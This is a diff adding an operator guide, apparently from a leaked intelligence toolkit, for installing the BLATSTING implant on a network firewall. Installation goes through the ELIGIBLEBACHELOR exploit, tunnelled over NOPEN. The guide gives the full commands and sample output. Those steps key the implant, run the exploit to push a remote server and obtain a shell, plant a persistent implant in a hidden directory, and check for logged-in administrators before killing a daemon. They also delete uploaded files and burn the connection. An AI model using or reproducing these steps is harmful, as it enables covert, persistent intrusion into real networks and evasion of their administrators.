@@ -1,0 +1,323 @@
+#
+#	These instructions guide the INSTALLATION of BLATSTING using
+#	ELIGIBLEBACHELOR via NOPEN tunnel.
+#
+#	Before starting this procedure, you should have the following files in the
+#	following locations:
+#
+#		/current/up/morerats/noserver-linux     symbolic link to RedHat 5.0 noserver
+#
+#		/current/bin/noclient             noclient for Linux
+#
+#		/current/bin/FW/BLATSTING_20222   BLATSTING package directory
+#
+#		/current/bin/FW/ELBA              ELIGIBLEBACHELOR package directory
+#
+#	These notes were prepared using NOPEN 3.0.4.1
+#
+#	Before proceeding you MUST know the version of the firewall software. This
+#	is a required parameter to ELIGIBLEBACHELOR.
+#
+#
+# 0. If this is the first time you are installing this implant, you'll need to
+#    key the implant for deployment. This procedure can be during set-up or at
+#    the time of the operation. It need not be performed on the operations
+#    box.
+#
+#    Perform the following steps:
+#      - generate a new key:
+
+$ cd /current/bin/FW/BLATSTING_20222
+$ utils/generate_new_key.sh --help
+
+Usage: utils/generate_new_key.sh > <outputfile>
+   Pertinent environment variables:
+      RANDOMDEV: random device (default: /dev/random)
+$ utils/generate_new_key.sh > config/key_for_target
+If this script hangs, please type on the keyboard to generate more random data for /dev/random.
+$
+
+#
+#   Install the new key in the implant:
+#
+$ ./utils/rekeybp -h
+usage: ./utils/rekeybp [ options ]
+options:
+    -p old_password (if not the default)
+    -P new_password (use - for default)
+    -k old_key_file
+    -K new_key_file
+    -i installer_file (default: runme
+    -h displays this message
+
+$ cp target/runme runme.keyed
+$ ./utils/rekeybp -k config/key.unkeyed -K config/key_for_target -i runme.keyed
+
+#
+#   If this step fails, do not install. Consult a BLATSTING developer.
+#
+#   You will need to save the generated key file, as it contains the
+#   cryptographic keys you'll need to contact the implant. When a key file is
+#   referenced below, this is the key file you will use.
+#
+#
+#   Installation via a NOPEN redirector requires a tunnel from the local NOPEN
+#   client to the NOPEN server where local port 5000 is tunneled from the local
+#   NOPEN client to the NOPEN server source port 4050 to the firewall ip
+$   "firewall_ip" port 4000.
+#
+NO> -tunnel
+l 5000 firewall_ip 4000 4050
+
+
+#
+# 1. Run ELIGIBLEBACHELOR. Success should return a NOPEN prompt.
+#
+$ cd /current/bin
+$ ./ELBA.sh
+usage: ./ELBA.sh version [ options ]
+Currently supported versions:
+        v3.2.100.010
+        v3.3.001.050
+        v3.3.002.021
+        v3.3.002.030
+        vTEST
+./ELBA Called as: + ./ELBA +
+Usage: 
+   ./ELBA -t <dest IP> -a <address> [<options>] 
+  Options:
+      -t <dest IP>
+      -l <local port>
+      -p <remote port>
+      -r <rd port>
+      -a <address>
+      -y <delay time in useconds between packet sends (default 5000000)>
+      -d clear the dmesg
+      -g <immediately close connection after sending exploit>
+      -s clear the tty1
+      -P <prompt string (default: "")>
+      -q quiet mode (do not send "un""ame -a """""")
+      -R random buffer
+      -h print this message
+      -v <verbosity as an interger>
+====== NOPEN Options =======
+      -N use NOPEN redirector
+      -c <command line to run on local box to start nopen client>
+      Default: NHOME=/current /current/bin/noclient -i 3
+      -S <command line to run on target box to start nopen server>
+      Default: PATH=/tos/bin I=x tos_proxyd
+      -f <filename to use on the remote target box for the nopen server>
+      Default: /tos/bin/tos_proxyd
+      -n <nopen server pathname -- file will be sent to the target>
+      Default: /current/up/morerats/noserver
+Ignore the "-a" option. This script inserts the address.
+
+#
+#   Now execute ELIGIBLEBACHELOR using the defaults for NOPEN (as listed above).
+#   Provide any parameters where the default is not appropriate. Launch the
+#   script ELBA.sh specifying the correct firewall version, connect to
+#   the local host (127.0.0.1) port 5000 which uses source port 4050 via NOPEN
+#   redirection.
+#
+$ ./ELBA.sh <version> -t <target IP> -N -p 5000 -r 4050 -l 4050
+
+#
+# Executing the above prints lots of output.....
+#
+./ELBA Called as: + ./ELBA -a 0x083f4780 -t 127.0.0.1 -N -p 5000 -r 4050 -l 4050 +
+Destination IP: 127.0.0.1. Remote port: 5000. Local port: 4050. Address: 83f4780. Rd port: 4050.
+Connection established.
+Sending hello packet.
+Sent hello packet.
+Sending the real exploit
+................................................................................
+.........................
+Sending nopen server
+...............................................................................
+...............................................................................
+...............................................................................
+...............................................................................
+...............................................................................
+...............................................................................
+....
+Successfully sent the nopen server to the target.
+
+Starting the nopen client locally with the command "NHOME=/current /current/bin/noclient -i 3".
+
+NOPEN!                             v3.0.3.4
+
+sh: scanner: command not found
+sh: ourtn: command not found
+sh: scripme: command not found
+Tue Oct 14 18:59:51 GMT 2008
+NHOME=/current
+Reading resource file "/current/etc/norc"... ok
+TERM=xterm
+Initiating RSA key exchange
+  Generating random number... ok
+  Initializing RC6... ok
+  Sending random number... ok
+  Receiving random number... ok
+  Generating session key... 0x8CC339A19E82438E3CFA520665F2D6D9
+  Sending first verify string... ok
+  Receiving second verify string... ok
+  Checking second verify string... ok
+RSA key exchange complete
+
+#
+# Lots more output...
+# DO NOT allow NOPEN to run the automatic system discovery (option A for abort).
+#
+
+autodone v.1.20.4.2
+
+About to run "autodone" commands. This could take a while to run.
+
+Choices:
+
+   N) NOPEN will not callback--your only window will be busy for a while.
+   C) Have NOPEN callback to give you another window, then proceed with autodone.
+   A) Abort autodone for this window/session.
+   D) Abort autodone PERMANENTLY for this host in this and any other NOPEN window.
+
+   NOTE: Only choose "D" if you know this host has already been done (perhaps
+         under a different IP?), or you DO NOT WANT it done, AND DO NOT want it
+         done later.  AND, you'd better have a REALLY good reason...
+
+Choose from above: [N] A
+2008-10-14 18:59:57 GMT autodone[27042]: ABORTING autodone
+
+#
+# More output...
+#
+
+We will be reading from 11
+NO! (none):/>Controlling terminal closed, going back to 0
+NO! (none):/>
+
+#
+# If ELIGIBLEBACHELOR fails to create the NOPEN connection see the
+# troubleshooting section below.
+#
+# If ELIGIBLEBACHELOR succeeds immediatly run "ps" on the firewall via nopen
+# and check for any admin logged on to the system. This is done by looking at
+# the output to see any commands like "-shell -c 3 #" which indicates an admin
+# is logged on. If you see no admins then immediatly run "killall tos_configd"
+# on the firewall via nopen to reset the configuration daemon. It is in an
+# unstable state and the system will restart it after it dies. If an admin is
+# logged on and you run this killall command you will kill your connection too.
+#
+NO! (none):/> killall tos_configd
+
+#
+# Since the NOPEN server is already running it is safe to remove the binary
+# that was uploaded to /data/tos_proxyd.
+#
+NO! (none):/>-rm /tos/bin/tos_proxyd
+
+##############################################################################
+#
+#						BLATSTING installation
+#
+##############################################################################
+
+#
+# 1. Verify that the target system is as expected:
+#    Run;
+NO! (none):/> uname -r
+
+#
+# 2. Upload the installer to the target system. One file is uploaded
+# and executed from a directory you will make. You must use the directory
+# specified. DON'T FORGET the "-" in front of the cd and put commands!
+# NOTE: Do not access the /data/.tos_cores directory in any way since it
+# is hidden and doing so will eliminate the persistence!
+#
+NO! (none):/> mkdir /data/.tos_cores
+NO! (none):/> -cd /tmp
+NO! (none):/> -put ../bp/runme.keyed runme.keyed
+
+#
+# 3. Execute the installer which will also launch the implant. Verify the exit
+# code. The echo MUST appear on the same line as the program executed in order
+# to get the correct error code from the program.
+#
+NO! (none):/> ./runme.keyed; echo $?
+0
+NO! (none):/>
+
+#
+# 4. If the installation succeeded, verify that you can contact the implant
+#    using the listening post. Set up a UDP redirector via your pitch. The
+#    following example is for NOPEN from your LP to your pitch:
+#
+
+NO! bnf-fw02:/root/NOPEN>-tunnel
+[10-17-08 16:24:05 GMT][localhost:33794 -> bnf-fw02.3.3.3.3:32754]
+[-tunnel]
+u 2212 1.1.1.1
+[u 2212 1.1.1.1]
+Connecting UDP on channel 1
+NOTICE: Connection Attempt success channel 1
+
+#
+#    On the local box in a separate window, run the BLATSTING listening post:
+#
+$ cd /current/bin/FW/BLATSTING_20222
+$ LP/lp --help
+./LP/lpexe Called as: + ./LP/lpexe --help +
+lp Version: 2.0.0.1 (Built: Sep  4 2008 06:16:55)
+
+./LP/lpexe: unrecognized option `--help'
+Usage: ./LP/lpexe <options>
+Options: --lp         Listening Post IP Address
+         --implant    Implant IP Address
+         --idkey      Implant ID Key File
+         --sport      Specify Port to Send Packets From
+         --dport      Specify Port to Send Packets To
+         [--logfile]  File to Log to
+         [--timeout]  Listening Post Timeout Threshold  (Optional)
+         [--scriptable]  Run ./LP/lpexe in scriptable mode (no readline).
+         [--nomenu]   Turn menu off.
+         [--quit-after-first-error]
+
+$ LP/lp --lp 127.0.0.1 --implant 127.0.0.1 --idkey config/key_for_target --sport
+2242 --dport 2212
+
+#
+#    Connect to the implant using option '1', and verify that the connection
+#    succeeds. Query the list of running modules (5 0 0).
+#
+
+10:17:37 2008-10-16  Menu Selection> 5 0 0
+10:17:39 2008-10-16  ===> selection 5 0 0
+Modules:
+  Module ID   Module type    Status     Persistence     State      Owned by
+                                                                   installer
+   0  0  3    core            running   persistent*     no state      n
+   5  0  3    install         running   persistent*     has state     n
+   2  0  1    file            running   persistent*     has state     n
+  12  1  1    bpf             running   persistent*     no state      n
+   3  0  2    network         running   persistent*     no state      n
+   1  1  1    crypto          running   persistent*     no state      n
+   8  1  1    hash            running   persistent*     no state      n
+   7  0  1    cnc             running   persistent*     no state      n
+
+10:17:39 2008-10-16  Menu Selection> 
+
+#
+#   The modules are in a persistent state, as the above list indicates. They
+#   will restart after a reboot.
+#
+#   You have now successfully installed the BLATSTING implant.
+#
+#   If you did not run the "killall tos_configd" above due to an admin being
+#   logged in do it now. This will disconnect any one logged on to the system.
+#   Be aware that this may also close your NOPEN connection.
+NO! (none):/> killall tos_configd
+
+#
+#   If you are still connected to the NOPEN server on the firewall you can
+#   burn the connection now.
+#
+NO! (none):/tmp>-burnBURN
